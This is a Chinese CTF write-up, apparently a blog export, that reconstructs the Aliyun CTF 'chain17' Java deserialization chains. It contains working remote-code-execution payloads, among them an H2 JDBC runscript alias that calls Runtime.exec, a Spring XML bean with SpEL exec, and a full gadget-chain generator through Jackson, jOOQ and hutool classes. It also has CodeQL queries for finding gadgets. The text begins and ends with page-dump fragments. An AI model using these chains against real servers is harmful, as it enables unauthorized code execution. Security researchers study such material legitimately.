结语\n\n其实这个算不上是污点追踪，因为每一个类的里面的每一个属性都是可以通过反射或者一些其它的方式来进行赋值的。和我的另一篇文章其实不太一样。https://xz.aliyun.com/t/16468\n\n参考\n\nhttps://xz.aliyun.com/t/14190\n\nhttps://xz.aliyun.com/t/15487\n\nhttps://xz.aliyun.com/t/14298\n\n\n\n\n\n","source":"_posts/chain17.md","raw":"---\ntags:\n  - java安全\n  - myblog\n  - 代码审计\ntitle: aliyun ctf chain17 回顾\ndata: 2024-12-14\n---\n\n# agent\n## sink h2 jdbc attack\n\n```xml\n<dependency>\n    <groupId>cn.hutool</groupId>\n    <artifactId>hutool-all</artifactId>\n    <version>5.8.16</version>\n</dependency>\n```\n\npoc.sql\n\n```sql\nCREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"su18\";}';\nCALL EXEC ('calc')\n```\n\nattack\n\n### official\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\n\nUnsafe unsafe = (Unsafe) ReflectUtil.getFieldValue(null, ReflectUtil.getField(Unsafe.class, \"theUnsafe\"));\nPooledDSFactory pooledDSFactory = (PooledDSFactory) unsafe.allocateInstance(PooledDSFactory.class);\n\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nReflectUtil.setFieldValue(pooledDSFactory,\"setting\",setting);\nHashMap<Object, Object> dsmap = new HashMap<>();\nReflectUtil.setFieldValue(pooledDSFactory,\"dsMap\",dsmap);\n\npooledDSFactory.getDataSource().getConnection();\n```\n\nunsafe.allocateInstance 这里主要是用来构造一个类。\n\nReflectUtil.setFieldValue  是hutool里面特有的用来反射用的。师傅们也可以用自己平时封装好的。\n\n### my own\n当然其实也不必像官方wp系的那样复杂。\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\npooledDSFactory.getDataSource().getConnection();\n```\n\n### sink点的选择\n\n至于为什么不选择jdk原生的getConnection来作为sink点，我感觉还是因为这个地方没有提供一个实例吧。就仅仅是加载驱动，然后连接。hutool 给了我们一个很好的这样的sink点。\n\n```java\nClass.forName(\"org.h2.Driver\");\nDriverManager.getConnection(\"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\");\n```\n但是如果我们想要在getDataSource()的时候就已经触发getConnection 我们还需要多一个设置 initialSize\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nsetting.put(\"initialSize\", \"1\");  // initialSize 为 1\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\npooledDSFactory.getDataSource();\n```\n\n## any get gadget\n\n既然是 spring。首选肯定是jackson链。\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\n\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nsetting.put(\"initialSize\", \"1\");\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\npooledDSFactory.getDataSource().getConnection();\n\nClassPool classPool = ClassPool.getDefault();\nClassPool.getDefault().appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));\nCtClass ctClass = classPool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\nCtMethod ctMethod = ctClass.getDeclaredMethod(\"writeReplace\");\nctClass.removeMethod(ctMethod);\nctClass.toClass();\n\nPOJONode pojoNode = new POJONode(pooledDSFactory);\npojoNode.toString();\n```\n\n\n## toString gadget\n\n知道source和sink之后其实我们就可以进行查询了。\n\n```java\n/**\n@kind path-problem\n*/\nimport java\nimport semmle.code.java.dataflow.FlowSources\n\nclass Source extends Method{\n    Source(){\n        this.getDeclaringType().getASupertype*() instanceof TypeSerializable and\n        this.getName().matches(\"put\") and\n        this.isPublic() and\n        getDeclaringType().getQualifiedName().matches(\"%hutool%\") and\n        this.getNumberOfParameters() = 2\n    }\n}\n\nclass Sink extends Method{\n    Sink(){\n        exists(MethodAccess ac|  \n            ac.getMethod().getName().matches(\"toString\")\n            and\n            ac.getMethod().getNumberOfParameters() = 0 // this.hasNoParameters()\n            and\n            getDeclaringType().getQualifiedName().matches(\"%hutool%\")\n            and \n            this = ac.getCaller() \n        ) and\n        getDeclaringType().getASupertype*() instanceof TypeSerializable\n        \n    }\n} \n\nquery predicate edges(Method a, Method b) { \n    a.polyCalls(b)and\n    (a.getDeclaringType().getASupertype*() instanceof TypeSerializable or a.isStatic()) and\n    (b.getDeclaringType().getASupertype*() instanceof TypeSerializable or b.isStatic()) \n}\n\nfrom Source source, Sink sink\nwhere edges+(source, sink)\nselect source, source, sink, \"$@ $@ to $@ $@\" ,\nsource.getDeclaringType(),source.getDeclaringType().getName(),\nsource,source.getName(),\nsink.getDeclaringType(),sink.getDeclaringType().getName(),\nsink,sink.getName()\n```\n\n挑选一个。\n\n![image-20241213225124321](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213225124321.png)\n\n我们现在的目标就是put到toString\n然后就在hutools里面找找到了一个 JSONObject\n\n```\nwrap:800, JSONUtil (cn.hutool.json)\nset:393, JSONObject (cn.hutool.json)\nset:352, JSONObject (cn.hutool.json)\nput:340, JSONObject (cn.hutool.json)\nput:32, JSONObject (cn.hutool.json)\n```\n\n但是是有要求的。而且必须是jdk原生类才行。\n![image-20241209172907925](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241209172907925.png)\n\n## AtomicReference \n然后我们查找，发现有一个 。这个结果其实听过的，我过滤的这么严格，最后还能有700多个结果。过滤的不太严格的话电脑就直接卡死了。我感觉可以利用的应该挺多的。\n\n别忘了 dockerfile 里面还有一个这样的一个参数  `--add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED` 所以我们筛选原生类的时候也可以缩小一些范围。\n```java\n/**\n@kind path-problem\n*/\nimport java\nimport semmle.code.java.dataflow.FlowSources\n\nclass Source extends Method{ \n    Source(){  // java.util.concurrent.atomic.AtomicReference\n        this.getDeclaringType().getASupertype*() instanceof TypeSerializable and\n        this.getQualifiedName().matches(\"java.util.concurrent.atomic.AtomicReference%\") and\n        not this.getDeclaringType().getASupertype*() instanceof TypeNumber and\n        not this.getQualifiedName().matches(\"cn.hutool.json.JSON%\") and\n        not this.getQualifiedName().matches(\"java.lang.CharSequence%\") and\n        not this.getQualifiedName().matches(\"java.sql.SQLException%\") and\n        not this.getQualifiedName().matches(\"java.util.Map%\") and\n        not this.getQualifiedName().matches(\"java.util.Date%\") and\n        not this.getQualifiedName().matches(\"java.util.Calendar%\") and\n        not this.getQualifiedName().matches(\"java.time.temporal.TemporalAccessor%\") and\n        not this.getQualifiedName().matches(\"java.lang.Enum%\") and\n        this.getName().matches(\"toString\") and\n        this.isPublic() and\n        this.getNumberOfParameters() = 0\n    }\n}\n\nclass Sink extends Method{\n    Sink(){\n        exists(MethodAccess ac|  \n            ac.getMethod().getName().matches(\"toString\")\n            and\n            ac.getMethod().getNumberOfParameters() = 0 // this.hasNoParameters()\n            and \n            this = ac.getCaller()\n        ) and\n        getDeclaringType().getASupertype*() instanceof TypeSerializable\n        \n    }\n} \n\nquery predicate edges(Method a, Method b) { \n    a.polyCalls(b)and\n    (a.getDeclaringType().getASupertype*() instanceof TypeSerializable or a.isStatic()) and\n    (b.getDeclaringType().getASupertype*() instanceof TypeSerializable or b.isStatic()) \n}\n\nfrom Source source, Sink sink\nwhere edges+(source, sink)\nselect source, source, sink, \"$@ $@ to $@ $@\" ,\nsource.getDeclaringType(),source.getDeclaringType().getName(),\nsource,source.getName(),\nsink.getDeclaringType(),sink.getDeclaringType().getName(),\nsink,sink.getName()\n```\n\n![image-20241214002242218](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241214002242218.png)\n\nAtomicReference  这个类的toString方法，会调用自身value属性的toString。\n\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\n\n//  pooledDSFactory.getDataSource();\nClassPool classPool = ClassPool.getDefault();\nClassPool.getDefault().appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));\nCtClass ctClass = classPool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\nCtMethod ctMethod = ctClass.getDeclaredMethod(\"writeReplace\");\nctClass.removeMethod(ctMethod);\nctClass.toClass();\n\nPOJONode pojoNode = new POJONode(pooledDSFactory);\n\n//   pojoNode.toString();\nObject object = new AtomicReference<>(pojoNode);\n//   object.toString();\n\nJSONObject jsonObject = new JSONObject();\njsonObject.put(\"aaa\",object);\n```\n\n## unsafe.allocateInstance\n\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\n\n这样实例化出来的 pooledDSFactory 是无法被序列化的。\n\nUnsafe中提供allocateInstance方法，仅通过Class对象就可以创建此类的实例对象，而且不需要调用其构造函数、初始化代码、JVM安全检查等\n\n## writeMapBegin\n\n为什么要用这种方法将 JSONObject 写入进去。\n\n```java\nhessian2Output.writeMapBegin(JSONObject.class.getName());\nhessian2Output.writeObject(\"whatever\");\nhessian2Output.writeObject(object);\nhessian2Output.writeMapEnd();\nhessian2Output.close();\n```\n\n因为会提前触发put方法，导致 entries 的value没有值。上面那个其实就相当于构造一个map，然后kay和value分别是\"whatever\" 和 object。\n\n```java\nJSONObject entries = new JSONObject();\nentries.put(\"aaa\",object);\nhessian2Output.writeObject(entries);\n```\n\n## Bean\n\n这个地方为什么要套上一层Bean\n\n```java\nBean bean = new Bean();\nbean.setData(SerializeUtil.serialize(pooledDSFactory));\n```\n\n问题就在于JavaDeserializer实例化PooledDSFactory的时候调用的是无参构造。\n\n![image-20241213175724894](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175724894.png)\n\n```\ncreateDbSetting:87, GlobalDbConfig (cn.hutool.db)\n<init>:50, AbstractDSFactory (cn.hutool.db.ds)\n<init>:25, PooledDSFactory (cn.hutool.db.ds.pooled)\n<init>:21, PooledDSFactory (cn.hutool.db.ds.pooled)\ninstantiate:313, JavaDeserializer (com.alibaba.com.caucho.hessian.io)\nreadObject:202, JavaDeserializer (com.alibaba.com.caucho.hessian.io)\n```\n\n若是无参构造，走到这里的时候会去加载配置文件。然后没有配置文件的话就会抛出异常报错。\n\n![image-20241213175938825](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175938825.png)\n\n## POJONode \n\n```\ngetDataSource:62, DSFactory (cn.hutool.db.ds)\ninvoke:568, Method (java.lang.reflect)\nserializeAsField:688, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)\nserializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)\nserialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)\nserializeAsField:732, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)\nserializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)\nserialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)\n```\n\n看最后的那几步。\n\n套一层Bean和没有多套那一层Bean多了最后那重复的三步。其实就是多了一个递归调用。\n\n首先在这个地方找到value对应的Serializer，然后进行serialize。\n\nSerializerProvider.defaultSerializeValue()\n\n![image-20241213215330708](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215330708.png)\n\n然后是获取对应的File。\n\nBeanSerializer.serialize()\n\n![image-20241213215621613](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215621613.png)\n\n然后通过反射调用对应的get方法。然后get到对应的value。此时的value就已经是PooledDSFactory了。然后再进行一次这样的步骤，调用PooledDSFactory的任意get方法。\n\nBeanPropertyWriter.serializeAsField()\n\n![image-20241213215902133](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215902133.png)\n\n# server\n\n## sink\npoc.xml\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n<beans xmlns=\"http://www.springframework.org/schema/beans\"  \n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">  \n    <bean id=\"evil\" class=\"java.lang.String\">  \n            <constructor-arg value=\"#{T(Runtime).getRuntime().exec('open -a Calculator')}\"/>  \n    </bean></beans>\n```\n```\nnew ClassPathXmlApplicationContext(\"http://127.0.0.1:7777/poc.xml\");\n```\n这样我们就可以达到命令执行的效果。然后我们就是如何来实例化这个类。\n\n## 中间链思路\n\n其实可以利用   EventListenerList ReadObject -> toString 这个gadget。\n\nhttps://xz.aliyun.com/t/15487  今年羊城杯的时候遇到过。\n\n然后再利用jackson  toString -> 任意get的这个gadget\n然后寻找  任意get ->  newInstance 这个 gadget 。这个链子我们用codeql寻找。\n\n然后我们以任意的get方法作为source，以 newInstance 方法作为sink点。进行查找。\n\n## codeql\n\n经过codeql查询之后我们构建如下。\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\n\nclass Source extends Method{\n    Source(){\n        this.getDeclaringType().getASupertype*() instanceof TypeSerializable and\n        this.getName().indexOf(\"get\") = 0 and\n        this.getName().length() > 3 and\n        this.isPublic() and\n        this.fromSource() and\n        this.hasNoParameters()\n        and\n        getDeclaringType().getQualifiedName().matches(\"%jooq%\")\n    }\n} \n\nclass Sink extends Method{\n    Sink(){\n        exists(MethodAccess ac|  \n            ac.getMethod().getName().matches(\"%newInstance%\")\n            and\n            ac.getMethod().getNumberOfParameters() = 1 \n            and\n            getDeclaringType().getQualifiedName().matches(\"%jooq%\")\n            and \n            this = ac.getCaller() \n        )\n        and\n        getDeclaringType().getASupertype*() instanceof TypeSerializable\n    }\n} \n\nquery predicate edges(Method a, Method b) { \n    a.polyCalls(b)and\n    (a.getDeclaringType().getASupertype*() instanceof TypeSerializable or a.isStatic()) and\n    (b.getDeclaringType().getASupertype*() instanceof TypeSerializable or b.isStatic()) \n}\n\nfrom Source source, Sink sink\nwhere edges+(source, sink)\nselect source, source, sink, \"$@ $@ to $@ $@\" ,\nsource.getDeclaringType(),source.getDeclaringType().getName(),\nsource,source.getName(),\nsink.getDeclaringType(),sink.getDeclaringType().getName(),\nsink,sink.getName()\n```\n\n\n\n![image-20241213151447092](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213151447092.png)\n\n### 链子分析\n\n我们还是从sink to source方向分析。\nConvert$ConvertAll.from() \n\n![image-20241213133621747](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133621747.png)\n\n![image-20241213125644892](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213125644892.png)\n\n代码大致逻辑就是获取 toClass 的 Constructor ，获取 Constructor 的 ParameterType 。将from作为参数。然后实例化。\n\n我们需要将 constructor 设为 ClassPathXmlApplicationContext。再往前看就是这个类的 toClass属性。然后里面的这个参数需要通过 `Convert.convert(from, types[0])` 获取。\n\n跟进 `Convert.convert()`。返回的就是我们的 from。这个from需要是是一个Object类，然后值为`http://127.0.0.1:7777/poc.xml`\n\n![image-20241213133224054](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png)\n\n然后看ConvertAll的构造函数，并看到了toClass如何赋值的。还有就是我们的这个from需要传入进来。\n\n![image-20241213130234507](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213130234507.png)\n\nSink2Source，然后我们继续往上找。\n\n还是 Convert.convert() ，但是这次走的时else分支。\n\n![image-20241213133224054](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png)\n\n在实例化的时候对我们toClass属性进行赋值。\n\n![image-20241213134519741](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134519741.png)\n\n最后调用到ConvertAll的from。\n\n![image-20241213134622868](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134622868.png)\n\nSink2Source，继续找\n\nAbstractDataType.convert()\n\n![image-20241213154104453](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154104453.png)\n\nAbstractDataType 没有 getType 方法。我们找一下它的继承关系。然后找到了DefaultDataType这个类的getType 方法。返回的是这个类的uType属性。然后这个object也就是我们上面说的那个from变量。需要是Object类，然后值为`http://127.0.0.1:7777/poc.xml`\n\n![image-20241213154143689](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154143689.png)\n\n![image-20241213154348497](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154348497.png)\n\nSink2Source，继续找\n\nConvertedVal.getValue() \n\n然后这个 delegate.getValue() 是 `http://127.0.0.1:7777/poc.xml` 然后这个getDataType需要是DefaultDataType。我们这里初始化这个类用它的子类TableDataType。\n\n![image-20241213154655516](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154655516.png)\n\n### 构造\n\n然后我们将codeql分析的这部分进行构造。\n\n\n```java\nClass clazz1 = Class.forName(\"org.jooq.impl.Dual\");\nConstructor constructor1 = clazz1.getDeclaredConstructors()[0];\nconstructor1.setAccessible(true);\nObject table = constructor1.newInstance();\n\nClass clazz2 = Class.forName(\"org.jooq.impl.TableDataType\");\nConstructor constructor2 = clazz2.getDeclaredConstructors()[0];\nconstructor2.setAccessible(true);\nObject tableDataType = constructor2.newInstance(table);\n\nClass clazz3 = Class.forName(\"org.jooq.impl.Val\");\nConstructor constructor3 = clazz3.getDeclaredConstructor(Object.class, DataType.class, boolean.class);\nconstructor3.setAccessible(true);\nObject val = constructor3.newInstance(\"whatever\", tableDataType, false);\n\nClass clazz4 = Class.forName(\"org.jooq.impl.ConvertedVal\");\nConstructor constructor4 = clazz4.getDeclaredConstructors()[0];\nconstructor4.setAccessible(true);\nObject convertedVal = constructor4.newInstance(val, tableDataType);\n\nObject value = \"http://127.0.0.1:7777/poc.xml\";\nClass type = ClassPathXmlApplicationContext.class;\n\nReflectUtil.setFieldValue(val, \"value\", value);\nReflectUtil.setFieldValue(tableDataType, \"uType\", type);\n\nMethod m = convertedVal.getClass().getMethod(\"getValue\");\nm.setAccessible(true);\nm.invoke(convertedVal);\n```\n\n最终的poc就如官方给的那样。\n\n```java\npublic class PocServer {\n\n    public static void main(String[] args) throws Exception {\n        gen(\"http://127.0.0.1:7777/poc.xml\");\n    }\n\n    public static void gen(String url) throws Exception{\n        Class clazz1 = Class.forName(\"org.jooq.impl.Dual\");\n        Constructor constructor1 = clazz1.getDeclaredConstructors()[0];\n        constructor1.setAccessible(true);\n        Object table = constructor1.newInstance();\n\n        Class clazz2 = Class.forName(\"org.jooq.impl.TableDataType\");\n        Constructor constructor2 = clazz2.getDeclaredConstructors()[0];\n        constructor2.setAccessible(true);\n        Object tableDataType = constructor2.newInstance(table);\n\n        Class clazz3 = Class.forName(\"org.jooq.impl.Val\");\n        Constructor constructor3 = clazz3.getDeclaredConstructor(Object.class, DataType.class, boolean.class);\n        constructor3.setAccessible(true);\n        Object val = constructor3.newInstance(\"whatever\", tableDataType, false);\n\n        Class clazz4 = Class.forName(\"org.jooq.impl.ConvertedVal\");\n        Constructor constructor4 = clazz4.getDeclaredConstructors()[0];\n        constructor4.setAccessible(true);\n        Object convertedVal = constructor4.newInstance(val, tableDataType);\n\n        Object value = url;\n        Class type = ClassPathXmlApplicationContext.class;\n\n        ReflectUtil.setFieldValue(val, \"value\", value);\n        ReflectUtil.setFieldValue(tableDataType, \"uType\", type);\n\n        ClassPool classPool = ClassPool.getDefault();\n        ClassPool.getDefault().appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));\n        CtClass ctClass = classPool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\n        CtMethod ctMethod = ctClass.getDeclaredMethod(\"writeReplace\");\n        ctClass.removeMethod(ctMethod);\n        ctClass.toClass();\n\n        POJONode pojoNode = new POJONode(convertedVal);\n\n        EventListenerList eventListenerList = new EventListenerList();\n        UndoManager undoManager = new UndoManager();\n        Vector vector = (Vector) ReflectUtil.getFieldValue(undoManager, \"edits\");\n        vector.add(pojoNode);\n        ReflectUtil.setFieldValue(eventListenerList, \"listenerList\", new Object[]{InternalError.class, undoManager});\n\n        byte[] data = SerializeUtil.serialize(eventListenerList);\n\n        System.out.println(Base64.getEncoder().encodeToString(data));\n\n    }\n}\n```\n\n# codeql database\n\nhutool和jooq的数据库都是 通过github action 直接生成的。但是导入mac 的话是无法成功的，但是windows可以。\n\nhttps://www.cnblogs.com/kingbridge/articles/18100619\n\njdk的数据库虽然题目是jdk17的，但是我用的是jdk8的数据库。这位作者已经弄好了，直接用即可。\n\nhttps://blog.csdn.net/mole_exp/article/details/122330521\n\n题目比较久远了，这里附上题目的附件。\n\nhttps://pan.baidu.com/s/1FnsS0vMr3mR93yL-rY3NaA?pwd=1234\n\n# 结语\n\n其实这个算不上是污点追踪，因为每一个类的里面的每一个属性都是可以通过反射或者一些其它的方式来进行赋值的。和我的另一篇文章其实不太一样。https://xz.aliyun.com/t/16468\n\n参考\n\nhttps://xz.aliyun.com/t/14190\n\nhttps://xz.aliyun.com/t/15487\n\nhttps://xz.aliyun.com/t/14298\n\n\n\n\n\n","slug":"chain17","published":1,"date":"2025-01-05T16:13:36.313Z","updated":"2025-01-05T16:13:36.313Z","_id":"cm5js0ud50000ub9ph0r28b26","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"agent\"><a href=\"#agent\" class=\"headerlink\" title=\"agent\"></a>agent</h1><h2 id=\"sink-h2-jdbc-attack\"><a href=\"#sink-h2-jdbc-attack\" class=\"headerlink\" title=\"sink h2 jdbc attack\"></a>sink h2 jdbc attack</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>cn.hutool<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>hutool-all<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.8.16<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>poc.sql</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> ALIAS <span class=\"keyword\">EXEC</span> <span class=\"keyword\">AS</span> <span class=\"string\">&#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;su18&quot;;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">CALL</span> <span class=\"keyword\">EXEC</span> (<span class=\"string\">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>attack</p>\n<h3 id=\"official\"><a href=\"#official\" class=\"headerlink\" title=\"official\"></a>official</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Unsafe</span> <span class=\"variable\">unsafe</span> <span class=\"operator\">=</span> (Unsafe) ReflectUtil.getFieldValue(<span class=\"literal\">null</span>, ReflectUtil.getField(Unsafe.class, <span class=\"string\">&quot;theUnsafe&quot;</span>));</span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> (PooledDSFactory) unsafe.allocateInstance(PooledDSFactory.class);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\">ReflectUtil.setFieldValue(pooledDSFactory,<span class=\"string\">&quot;setting&quot;</span>,setting);</span><br><span class=\"line\">HashMap&lt;Object, Object&gt; dsmap = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">ReflectUtil.setFieldValue(pooledDSFactory,<span class=\"string\">&quot;dsMap&quot;</span>,dsmap);</span><br><span class=\"line\"></span><br><span class=\"line\">pooledDSFactory.getDataSource().getConnection();</span><br></pre></td></tr></table></figure>\n\n<p>unsafe.allocateInstance 这里主要是用来构造一个类。</p>\n<p>ReflectUtil.setFieldValue  是hutool里面特有的用来反射用的。师傅们也可以用自己平时封装好的。</p>\n<h3 id=\"my-own\"><a href=\"#my-own\" class=\"headerlink\" title=\"my own\"></a>my own</h3><p>当然其实也不必像官方wp系的那样复杂。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PooledDSFactory</span>(setting);</span><br><span class=\"line\">pooledDSFactory.getDataSource().getConnection();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"sink点的选择\"><a href=\"#sink点的选择\" class=\"headerlink\" title=\"sink点的选择\"></a>sink点的选择</h3><p>至于为什么不选择jdk原生的getConnection来作为sink点，我感觉还是因为这个地方没有提供一个实例吧。就仅仅是加载驱动，然后连接。hutool 给了我们一个很好的这样的sink点。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class.forName(<span class=\"string\">&quot;org.h2.Driver&quot;</span>);</span><br><span class=\"line\">DriverManager.getConnection(<span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>但是如果我们想要在getDataSource()的时候就已经触发getConnection 我们还需要多一个设置 initialSize</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\">setting.put(<span class=\"string\">&quot;initialSize&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);  <span class=\"comment\">// initialSize 为 1</span></span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PooledDSFactory</span>(setting);</span><br><span class=\"line\">pooledDSFactory.getDataSource();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"any-get-gadget\"><a href=\"#any-get-gadget\" class=\"headerlink\" title=\"any get gadget\"></a>any get gadget</h2><p>既然是 spring。首选肯定是jackson链。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 